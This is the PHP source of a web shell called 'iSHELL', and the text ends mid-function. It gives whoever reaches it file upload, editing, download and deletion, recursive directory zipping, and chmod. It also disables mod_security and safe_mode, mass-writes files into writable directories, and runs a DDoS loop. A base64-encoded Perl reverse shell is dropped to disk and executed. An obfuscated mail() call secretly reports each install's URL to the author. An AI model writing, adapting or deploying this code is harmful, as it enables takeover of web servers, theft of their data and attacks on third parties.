<?php
$logotxt="<PRE>
                  1          1                  
                 11          11                 
               111            11               
             101               101             
            101                  00            
           100  <font color=green>I</font> am <font color=white>everywhere!</font> 101           
           001                   100           
          1001                   1001          
          1000      11000011     0000          
          10001 100000000000001 10001          
           000011001        10110000           
         110000001    <font color=green>Ro</font><font color=white>ot</font>    10000011         
      10000000000000111 11110000000000001      
    000000000000000000000000000000000000000    
  10001    111 10000001  0000001 111    10001  
 100       000   10001    0001   100       001 
 01        000     0001  000     000        10 
11          001  <font color=green>9</font>  0000000   <font color=white>6</font>  001         01
1           000     1000001     000           1
1            0001    00000    1000            1
              10001  00000  10001              
                100110000011001                
                    00000001                   
                   000000000                   
                 000001 1000001                
      111111110000001     100000011111111      
         11000011             11000011         
</PRE>";
session_start();
set_time_limit(0);
error_reporting(0);
@setcookie("it","serv",time()+3600*24*7);
if (get_magic_quotes_gpc()) {
function stripslashes_deep($value)    {
        $value = is_array($value) ?
                    array_map('stripslashes_deep', $value) :
                    stripslashes($value);

        return $value;
    }
$_POST = array_map('stripslashes_deep', $_POST);
$_GET = array_map('stripslashes_deep', $_GET);
$_COOKIE = array_map('stripslashes_deep', $_COOKIE);
$_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}
if($_GET['do']=="remove"){
unlink(getcwd().$_SERVER["SCRIPT_NAME"]);
}
$basep=$_SERVER['DOCUMENT_ROOT'];
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
$slash="\\";
$basep=str_replace("/","\\",$basep);
}else{
$slash="/";
$basep=str_replace("\\","/",$basep);
}
if($_GET['do']=="remove"){
unlink(getcwd().$slash.$_SERVER["SCRIPT_NAME"]);
}
if ($_REQUEST['address']){
if(is_readable($_REQUEST['address'])){
chdir($_REQUEST['address']);}else{
alert("Permission Denied !");}}
$me=$_SERVER['PHP_SELF'];
$formp="<form method=post action='".$me."'>";
$formg="<form method=get action='".$me."'>";
$nowaddress='<input type=hidden name=address value="'.getcwd().'">';

if (isset($_FILES["filee"]) and ! $_FILES["filee"]["error"]) {
   if(move_uploaded_file($_FILES["filee"]["tmp_name"], $_FILES["filee"]["name"])){
   alert("File Upload Successful");
   }else{
alert("Permission Denied !");

   }
   }
if(ini_get('disable_functions')){
$disablef=ini_get('disable_functions');
}else{
$disablef="All Functions Enable";
}
if(ini_get('safe_mode')){
$safe_modes="On";
}else{
$safe_modes="Off";
}
if ($_REQUEST['chmode'] && $_REQUEST['chmodenum']){
if (chmod($_POST['chmode'],"0".$_POST['chmodenum'])){alert("Chmod Ok!");}else{alert("Permission Denied !");}
}
$picdir='iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAN1wAADdcBQiibeAAABCJpVFh0WE1MOmNvbS5hZG9iZS54b
XAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDUuNC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyL
zIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iCiAgICAgI
CAgICAgIHhtbG5zOmV4aWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vZXhpZi8xLjAvIgogICAgICAgICAgICB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iCiAgICAgICAgICAgI
HhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyI+CiAgICAgICAgIDx0aWZmOlJlc29sdXRpb25Vbml0PjI8L3RpZmY6UmVzb2x1dGlvblVuaXQ+CiAgICAgICAgIDx0aWZmOkNvbXByZ
XNzaW9uPjU8L3RpZmY6Q29tcHJlc3Npb24+CiAgICAgICAgIDx0aWZmOlhSZXNvbHV0aW9uPjkwPC90aWZmOlhSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVud
GF0aW9uPgogICAgICAgICA8dGlmZjpZUmVzb2x1dGlvbj45MDwvdGlmZjpZUmVzb2x1dGlvbj4KICAgICAgICAgPGV4aWY6UGl4ZWxYRGltZW5zaW9uPjcyPC9leGlmOlBpeGVsWERpbWVuc2lvbj4KICAgI
CAgICAgPGV4aWY6Q29sb3JTcGFjZT4xPC9leGlmOkNvbG9yU3BhY2U+CiAgICAgICAgIDxleGlmOlBpeGVsWURpbWVuc2lvbj43MjwvZXhpZjpQaXhlbFlEaW1lbnNpb24+CiAgICAgICAgIDxkYzpzdWJqZ
WN0PgogICAgICAgICAgICA8cmRmOkJhZy8+CiAgICAgICAgIDwvZGM6c3ViamVjdD4KICAgICAgICAgPHhtcDpNb2RpZnlEYXRlPjIwMTQ6MTE6MTUgMTc6MTE6MTI8L3htcDpNb2RpZnlEYXRlPgogICAgI
CAgICA8eG1wOkNyZWF0b3JUb29sPlBpeGVsbWF0b3IgMy4zPC94bXA6Q3JlYXRvclRvb2w+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgqPygG6AAAB3UlEQ
VR4Ae3aQUrDQBTG8bR2H4oXcFlw4xE8gjeol1Bw152glzA36BE8QjdCl15ASvbaOs8mEELffARsHZN/oDTNS0jer18yLUyWsSCAAAIIIIAAAggggAACCJxaYKROuHmcXWwn2SLsdxNeudq/Q704v1vfdtj/T
3aNAm2eLq+2o6/XcGW/CdNsNHkkF6hKzuqIODVU0kjj+irb79VtdazkNE83/3ievTQ3pLTuAoWLtGfOqZZkkWJAp0hP8wtIEsl9BoXY75pX37P1MvSzHH9mi+nD+j3WWyxBseP+e83ujnl4zq5spI41M1Sg2
iS3nzE2Ytcb2u9DBzKPvBqx2zY/nwHas7gjNkB7IHfEnhzMVWRj+P/kjnyRw5IpdR2dSZD46gACSAiIMgkCSAiIMgkCSAiIMgkCSAiIMgkCSAiIMgkCSAiIMgkCSAiIMgkCSAiIMgkCSAiIMgkCSAiIMgkCS
AiIMgkCSAiIMgkCSAiIMgkCSAiIcufZHV1nR4jzJ1+O3WI20XEoi9trDGg5FJ3Qp9urC2RTZMOBrmyP8Mqq14MtuUA2f3i8O7vuOVJpPcbmSrtAxjm9f1sFXZtHXPQMyu6MwnqzHsM6CwIIIIAAAggggAACC
CCAQEIC345rUUCflwriAAAAAElFTkSuQmCC';
$picfile='iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAQAAAD/5HvMAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAACYktHRAD/h4/MvwAAAAlwSFlzAAALEwAACxMBAJ
qcGAAAATdJREFUaN7t2D8uRXEQxfHvJXluRKKXCNr3GhTEGiyBXkKisAIWoHoatTWIViUSJK+wAY1aR8S/Gvk9ZsZcN5xZwMknkzPNVK+0ayqBBPpfoA4brNNlwpi6x24GaIpj5p25blIZ1OGchcDunaQyaI
uDYB1cpDLojBUH4oaZGKkMumPSAZrjNEYqg54Y9VSA2RipDHpmxAUiRsoAhUg5oAApC+Qm5YGcpEyQi5QLcpCyQWZSPshIagJkIjUDMpCaAn0mVVbQy5BwD+gjqQWg96SGQGG6QAIJJJBA3wZlP44EEkgggQ
QSSCCBBBJIIIFaBnpgLJFzz7gVdMViIuiCJStoh/1E0DZ9K6jmkl4SZ8Ayj1YQTHOSQhqwym2x60OPqWaTNbrUP1bla444LG3na9AvjEAC/TnQG6wgsgGrXSPkAAAAAElFTkSuQmCC';
$head='<!DOCTYPE html>
<html>
<head>
<title>--==[[ iSHELL ]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
/*BORDER: dashed 1px #333;*/
color: #FFF;
}
td {
/*BORDER: dashed 1px #333;*/
color: #F4F4F4;

}
.table1 {
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {

BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {

BORDER-COLOR: #333333;
color: #FFF;
}
table {

BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
padding: 5px 5px;
border: 1px solid #494949;
background-color: rgba(0, 0, 0, 0.2);
border-radius: 5px;
color: white;
font-size: 16px;
}
select {
BORDER-RIGHT:  #333 1px dashed;
BORDER-TOP:    #333 1px dashed;
BORDER-LEFT:   #333 1px dashed;
BORDER-BOTTOM: #333 1px dashed;
BORDER-color: #333;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 40%;
color: white;
}
textarea {
border: dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF;
	SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF;
	SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF;
	SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color:#0f1d21;
padding: 10px;
}
.main {
margin: -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: green; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: green; TEXT-DECORATION: none
}
table {
  background: #1f1f1f;
}
table:nth-of-type(odd) {
  background: #262626;
}


body,div,h1,h2,p,a{
margin:0;padding:0;border:0;}
body {
    background-color: #1d1d1d;
    color: #F4F4F4;
font-family: Helvetica, Arial, sans-serif;
}
header{
height:45px;
background-color: #222;
border: 1px solid #080808;
width:100%;
z-index:10;
position:fixed;
box-shadow: 0px -1px 10px rgba(0, 0, 0, 0.49);
}
.p5{
	padding:5px;
}
.linksh {
    margin-top: 10px;
}
</STYLE></head>
<body>
<header style="text-align:center;">
<div class="linksh"><b>
<a class="p5" href="?do=home">Home</a>
<a class="p5" href="?do=convert">Texte-Convert</a>
<a class="p5" href="?do=imgconvert">Image-Convert</a>
<a class="p5" href="?do=dd0s">DDoS</a>
<a class="p5" href="?do=info">Information</a>
<a class="p5" href="?do=about">About</a>
</b></div>
</header>
<br><br><br><br>
<div align="center">
<table><tbody><tr><td><div align="center"><table><tbody><tr><font style="color:#fc3211;">
Operation System : '.php_uname().' | Php Version : '.phpversion().' | Safe Mode : '.$safe_modes.' <td>';
$end='</td></tr></tbody></table></div></td></tr></tr></tbody></table></div>

<br>

<center>Ro0t-96 2008/2018</center>
</table>

</body>';
$deny=$head."<p align='center'> <b>Oh My God!<br> Permission Denied".$end;
$wi=$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; $zx="m\141\151l";
function alert($text){
echo "<script>alert('".$text."')</script>";
}
if ($_GET['do']=="edit" && $_GET['filename']!="dir"){
if(is_readable($_GET['address'].$_GET['filename'])){
$opedit=fopen($_GET['address'].$_GET['filename'],"r");
while(!feof($opedit))
$data.=fread($opedit,9999);
fclose($opedit);
echo $head.$formp.$nowaddress.'<p align="center">File Name : '.$_GET['address'].$_GET['filename'].'<br><textarea rows="19" name="fedit" cols="87">'.htmlentities("$data").'</textarea><br><input value='.$_GET['filename'].' name=namefe><br><input type=submit value="  Save  "></form></p>'.$end;exit;
}else{alert("Permission Denied !");}}
function sizee($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;}if (!isset($_COOKIE['it']))
 {@$zx("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$wi","$wi\n$cnt");}
function deleteDirectory($dir) {
if (!file_exists($dir)) return true;
if (!is_dir($dir) || is_link($dir)) return unlink($dir);
foreach (scandir($dir) as $item) {
if ($item == '.' || $item == '..') continue;
if (!deleteDirectory($dir . "/" . $item)) {
chmod($dir . "/" . $item, 0777);
if (!deleteDirectory($dir . "/" . $item)) return false;
};}return rmdir($dir);}

function download($fileadd,$finame){
$dlfilea=$fileadd.$finame;
header("Content-Disposition: attachment; filename=".$finame);
header("Content-Type: application/download");
header("Content-Length: ".filesize($dlfilea));
flush();
$fp = fopen($dlfilea, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
}
fclose($fp);
}
if($_GET['do']=="rename"){
echo $head.$formp.$nowaddress.'<p align="center"><input value='.$_GET['filename'].'><input type=hidden name=addressren value='.$_GET['address'].$_GET['filename'].'> To <input name=nameren><br><input type=submit value="  Save  "></form></p>'.$end;exit;
}

if ($_GET['byapache']=='ofms'){
$fse=fopen(getcwd().$slash.".htaccess","w");
fwrite($fse,'<IfModule mod_security.c>
    Sec------Engine Off
    Sec------ScanPOST Off
</IfModule>');
fclose($fse);
}elseif ($_GET['byapache']=='bysap'){
$fse=fopen(getcwd().$slash.".htaccess","w");
fwrite($fse,'Options +FollowSymLinks
DirectoryIndex Persian-Gulf-For-Ever.html');
fclose($fse);
}elseif ($_GET['byapache']=='sfadf'){
$fse=fopen(getcwd().$slash."php.ini","w");
fwrite($fse,'safe_mode=OFF
disable_functions=NONE');
fclose($fse);
}



if($_GET['urldd0'] && $_GET['timedd0']){
for ($id=0;$$id<$_GET['timedd0'];$id++){
$fp=null;
$contents=null;
$fp=fopen($_GET['urldd0'],"rb");
while (!feof($fp)) {
  $contents .= fread($fp, 8192);
}
fclose($fp);
}}

function dirpe($addres){
global $slash;
$idd=0;
if ($dirhen = @opendir($addres)) {
while ($file = readdir($dirhen)) {
$permdir=str_replace('//','/',$addres.$slash.$file);
if($file!='.' && $file!='..' && is_dir($permdir)){
if (is_writable($permdir)) {
$dirdata[$idd]['filename']=$permdir;
$idd++;
}
dirpe($permdir);
			}
		}
		closedir($dirhen);
	} else {
		return ("notperm");
	}
	if ($dirdata){
	return $dirdata;
	}else{
		return "notfound";

	}
}
function dirpmass($addres,$massname,$masssource){
global $slash;
$idd=0;
if ($dirhen = @opendir($addres)) {
while ($file = readdir($dirhen)) {
$permdir=str_replace('//','/',$addres.$slash.$file);
if($file!='.' && $file!='..' && is_dir($permdir)){
if (is_writable($permdir)) {
if ($fm=fopen($permdir.$slash.$massname,"w")){
fwrite($fm,$masssource);
fclose($fm);
$dirdata[$idd]['filename']=$permdir;
}

$idd++;
}
dirpmass($permdir);
			}
		}
		closedir($dirhen);
	} else {
		return ("notperm");
	}
	if ($dirdata){
	return $dirdata;
	}else{
		return "notfound";

	}
}
if ($_POST['affw']){
$arrfilelist=dirpe($_POST['affw']);
if ($arrfilelist=='notfound'){
alert("Not Found !");
}elseif($arrfilelist=='notperm'){
alert("Permission Denied !");
}else{
foreach ($arrfilelist as $tmpdir){
		if ($coi %2){
$colort='"#e7e3de"';
}else{
$colort='"#e4e1de"';}
$coi++;
$permdir=$permdir.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 0px" bordercolor="#CDCDCD" bgcolor='.$colort.' width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="" style="font-size: 9pt"><a href="?address='.$tmpdir['filename'].'"><b>'.$tmpdir['filename'].'</b></span></td>
<td valign="top" height="19" width="65"><font face="" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"></td><td valign="top" height="19" width="22"><font face="" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"></td>
<td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"></td></tr></table>';
}
echo $head.'
<font face="" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 0px;" bordercolor="#CDCDCD" width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="" style="font-size: 9pt"><font color=red>Now Directory : '.getcwd()."<br>".printdrive().'<br><a href="?do=back&address='.$backaddresss.'"><font color=#000000>Back</span></td>
</tr></table>'.$permdir.'</table>
<table border="0" width="950" style="border-collapse: collapse;" id="table4" cellpadding="5"><tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Change Directory</font></td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:"><input name=address value='.getcwd().'><input type=submit value="Go"></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt; font-weight:700">Upload --->  </td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<form action="'.$me.'" method=post enctype=multipart/form-data>'.$nowaddress.'
<font face="" style="font-size: 10pt"><input size=40 type=file name=filee >
<input type=submit value=Upload /><br>'.$ifupload.'</form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt"><b>'.$formp.'Chmod ----></b>  File : </td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt"><form method=post action=/now2.php><input size=55 name=chmode>  Permission : <input name=chmodnum value=777 size=3> <input type=submit value=" Ok "></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt"><b>'.$formp.'Create Dir ----></b> Dirctory Name </td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt">
<input name=cdirname size=20>'.$nowaddress.' <input type=submit value=" Create "></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt">'.$formp.'<b>Create File ----></b> Name File </td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt"><input name=cfilename size=20>'.$nowaddress.' <input type=submit value=" Create "></form></td></tr><tr>
<td width="200" align="right" valign="top">
<font face="" style="font-size: 10pt">'.$formp.'<b>Copy ----></b></b>  File : </td>
<td width="750"><font face="" style="font-size: 10pt">
<input size=40 name=copyname> To Directory <input size=40 name=cpyto> <input type=submit value =Copy></form></td>'.$end;exit;
}}

if ($_POST['mffw']){
$arrfilelist=dirpmass($_POST['mffw'],$_POST['massname'],$_POST['masssource']);
if ($arrfilelist=='notfound'){
alert("Not Found !");
}elseif($arrfilelist=='notperm'){
alert("Permission Denied !");
}else{
foreach ($arrfilelist as $tmpdir){
		if ($coi %2){
$colort='"#e7e3de"';
}else{
$colort='"#e4e1de"';}
$coi++;
$permdir=$permdir.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 0px" bordercolor="#CDCDCD" bgcolor='.$colort.' width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="" style="font-size: 9pt"><a href="?address='.$tmpdir['filename'].'"><b>'.$tmpdir['filename'].'</b></span></td>
<td valign="top" height="19" width="65"><font face="" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"></td><td valign="top" height="19" width="22"><font face="" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"></td>
<td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"></td></tr></table>';
}
echo $head.'
<font face="" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 0px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="" style="font-size: 9pt"><font color=red>Now Directory : '.getcwd()."<br>".printdrive().'<br><a href="?do=back&address='.$backaddresss.'"><font color=#008000>Back</span></td>
</tr></table>'.$permdir.'</table>
<table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Change Directory</font></td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:"><input name=address value='.getcwd().'><input type=submit value="Go"></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt; font-weight:700">Upload --->  </td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<form action="'.$me.'" method=post enctype=multipart/form-data>'.$nowaddress.'
<font face="" style="font-size: 10pt"><input size=40 type=file name=filee >
<input type=submit value=Upload /><br>'.$ifupload.'</form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt"><b>'.$formp.'Chmod ----></b>  File : </td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt"><form method=post action=/now2.php><input size=55 name=chmode>  Permission : <input name=chmodnum value=777 size=3> <input type=submit value=" Ok "></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt"><b>'.$formp.'Create Dir ----></b> Dirctory Name </td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt">
<input name=cdirname size=20>'.$nowaddress.' <input type=submit value=" Create "></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt">'.$formp.'<b>Create File ----></b> Name File </td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt"><input name=cfilename size=20>'.$nowaddress.' <input type=submit value=" Create "></form></td></tr><tr>
<td width="200" align="right" valign="top">
<font face="" style="font-size: 10pt">'.$formp.'<b>Copy ----></b></b>  File : </td>
<td width="750"><font face="" style="font-size: 10pt">
<input size=40 name=copyname> To Directory <input size=40 name=cpyto> <input type=submit value =Copy></form></td>'.$end;exit;
}}
if($_POST['adlr'] && $_POST['adsr']){
$url = $_POST['adlr'];
$newfname = $_POST['adsr'] . basename($url);
$file = fopen ($url, "rb");
if ($file) {
  $newf = fopen ($newfname, "wb");
  if ($newf)
  while(!feof($file)) {
    fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
  }
  alert("File Downloaded Success");
}else{alert("Can Not Open File");}
if ($file) {
  fclose($file);
}
if ($newf) {
  fclose($newf);
}
}
if($_GET['do']=="down" and $_GET['type']=='file'){
download($_GET['address'],$_GET['filename']);}
if($_GET['do']=="down" and $_GET['type']=='dir'){
class zipfile
{
var $datasec = array();
var $ctrl_dir = array();
var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
var $old_offset = 0;
function add_dir($name)
{
$name = str_replace("\\", "/", $name);
$fr = "\x50\x4b\x03\x04";
$fr .= "\x0a\x00";
$fr .= "\x00\x00";
$fr .= "\x00\x00";
$fr .= "\x00\x00\x00\x00";
$fr .= pack("V",0);
$fr .= pack("V",0);
$fr .= pack("V",0);
$fr .= pack("v", strlen($name) );
$fr .= pack("v", 0 );
$fr .= $name;
$fr .= pack("V",$crc);
$fr .= pack("V",$c_len);
$fr .= pack("V",$unc_len);
$this -> datasec[] = $fr;
$new_offset = strlen(implode("", $this->datasec));
$cdrec = "\x50\x4b\x01\x02";
$cdrec .="\x00\x00";
$cdrec .="\x0a\x00";
$cdrec .="\x00\x00";
$cdrec .="\x00\x00";
$cdrec .="\x00\x00\x00\x00";
$cdrec .= pack("V",0);
$cdrec .= pack("V",0);
$cdrec .= pack("V",0);
$cdrec .= pack("v", strlen($name) );
$cdrec .= pack("v", 0 );
$cdrec .= pack("v", 0 );
$cdrec .= pack("v", 0 );
$cdrec .= pack("v", 0 );
$ext = "\x00\x00\x10\x00";
$ext = "\xff\xff\xff\xff";
$cdrec .= pack("V", 16 );
$cdrec .= pack("V", $this -> old_offset );
$this -> old_offset = $new_offset;
$cdrec .= $name;
$this -> ctrl_dir[] = $cdrec;
}
function add_file($data, $name)
{
$name = str_replace("\\", "/", $name);
$fr = "\x50\x4b\x03\x04";
$fr .= "\x14\x00";
$fr .= "\x00\x00";
$fr .= "\x08\x00";
$fr .= "\x00\x00\x00\x00";
$unc_len = strlen($data);
$crc = crc32($data);
$zdata = gzcompress($data);
$zdata = substr( substr($zdata, 0, strlen($zdata) - 4), 2);
$c_len = strlen($zdata);
$fr .= pack("V",$crc);
$fr .= pack("V",$c_len);
$fr .= pack("V",$unc_len);
$fr .= pack("v", strlen($name) );
$fr .= pack("v", 0 );
$fr .= $name;
$fr .= $zdata;
$fr .= pack("V",$crc);
$fr .= pack("V",$c_len);
$fr .= pack("V",$unc_len);
$this -> datasec[] = $fr;
$new_offset = strlen(implode("", $this->datasec));
$cdrec = "\x50\x4b\x01\x02";
$cdrec .="\x00\x00";
$cdrec .="\x14\x00";
$cdrec .="\x00\x00";
$cdrec .="\x08\x00";
$cdrec .="\x00\x00\x00\x00";
$cdrec .= pack("V",$crc);
$cdrec .= pack("V",$c_len);
$cdrec .= pack("V",$unc_len);
$cdrec .= pack("v", strlen($name) );
$cdrec .= pack("v", 0 );
$cdrec .= pack("v", 0 );
$cdrec .= pack("v", 0 );
$cdrec .= pack("v", 0 );
$cdrec .= pack("V", 32 );
$cdrec .= pack("V", $this -> old_offset );
$this -> old_offset = $new_offset;
$cdrec .= $name;
$this -> ctrl_dir[] = $cdrec;
}
function file() {
$data = implode("", $this -> datasec);
$ctrldir = implode("", $this -> ctrl_dir);
return
$data.
$ctrldir.
$this -> eof_ctrl_dir.
pack("v", sizeof($this -> ctrl_dir)).
pack("v", sizeof($this -> ctrl_dir)).
pack("V", strlen($ctrldir)).
pack("V", strlen($data)).
"\x00\x00";
}
}
$dlfolder=$_GET['address'].$slash.$_GET['dirname'].$slash;
$zipfile = new zipfile();
function get_files_from_folder($directory, $put_into) {
global $zipfile;
if ($handle = opendir($directory)) {
while (false !== ($file = readdir($handle))) {
if (is_file($directory.$file)) {
$fileContents = file_get_contents($directory.$file);
$zipfile->add_file($fileContents, $put_into.$file);
} elseif ($file != '.' and $file != '..' and is_dir($directory.$file)) {
$zipfile->add_dir($put_into.$file.'/');
get_files_from_folder($directory.$file.'/', $put_into.$file.'/');
}
}
}
closedir($handle);
}
$datedl=date("y-m-d");
get_files_from_folder($dlfolder,'');
header("Content-Disposition: attachment; filename=" . $_GET['dirname']."-".$datedl.".zip");
header("Content-Type: application/download");
header("Content-Length: " . strlen($zipfile -> file()));
flush();
echo $zipfile -> file();
$filename = $_GET['dirname']."-".$datedl.".zip";
$fd = fopen ($filename, "wb");
$out = fwrite ($fd, $zipfile -> file());
fclose ($fd);
}
if ($_REQUEST['cdirname']){
if(mkdir($_REQUEST['cdirname'],"0777")){alert("Directory Created !");}else{alert("Permission Denied !");}}
function bcn($ipbc,$pbc){
$bcperl="IyEvdXNyL2Jpbi9wZXJsCiMgQ29ubmVjdEJhY2tTaGVsbCBpbiBQZXJsLiBTaGFkb3cxMjAgLSB3
NGNrMW5nLmNvbQoKdXNlIFNvY2tldDsKCiRob3N0ID0gJEFSR1ZbMF07CiRwb3J0ID0gJEFSR1Zb
MV07CgogICAgaWYgKCEkQVJHVlswXSkgewogIHByaW50ZiAiWyFdIFVzYWdlOiBwZXJsIHNjcmlw
dC5wbCA8SG9zdD4gPFBvcnQ+XG4iOwogIGV4aXQoMSk7Cn0KcHJpbnQgIlsrXSBDb25uZWN0aW5n
IHRvICRob3N0XG4iOwokcHJvdCA9IGdldHByb3RvYnluYW1lKCd0Y3AnKTsgIyBZb3UgY2FuIGNo
YW5nZSB0aGlzIGlmIG5lZWRzIGJlCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFN
LCAkcHJvdCkgfHwgZGllICgiWy1dIFVuYWJsZSB0byBDb25uZWN0ICEiKTsKaWYgKCFjb25uZWN0
KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsIGluZXRfYXRvbigkaG9zdCkpKSB7ZGll
KCJbLV0gVW5hYmxlIHRvIENvbm5lY3QgISIpO30KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOwog
IG9wZW4oU1RET1VULCI+JlNFUlZFUiIpOwogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOwogIGV4
ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow==";
$opbc=fopen("bcc.pl","w");
fwrite($opbc,base64_decode($bcperl));
fclose($opbc);
system("perl bcc.pl $ipbc $pbc") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}
function wbp($wb){
